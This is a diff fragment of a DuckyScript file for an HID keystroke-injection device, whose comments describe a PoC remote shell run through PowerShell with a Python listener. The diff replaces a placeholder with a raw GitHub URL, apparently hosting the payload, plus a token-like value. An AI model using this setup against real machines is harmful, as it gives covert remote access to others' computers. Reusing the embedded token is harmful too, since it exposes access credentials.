@@ -7,7 +7,7 @@ REM       Requirements: Firmware Version 3.0 minimum, Universal Python Listener,
 REM       HID based remote shell, executed via powershell.
 
 REM Define the URL where you hosted your PoC
-DEFINE #URL https://example.com/
+DEFINE #URL (https://raw.githubusercontent.com/gunz0blazin/OMG-Scripts/refs/heads/main/REM%20HIDX_Stealth_Link_Remote_Access_PoC_.md?token=GHSAT0AAAAAAC5YCZG2TFRKYJ5SUWGI5EGMZ4ROURA)
 
 REM Define Keymap below
 DUCKY_LANG us
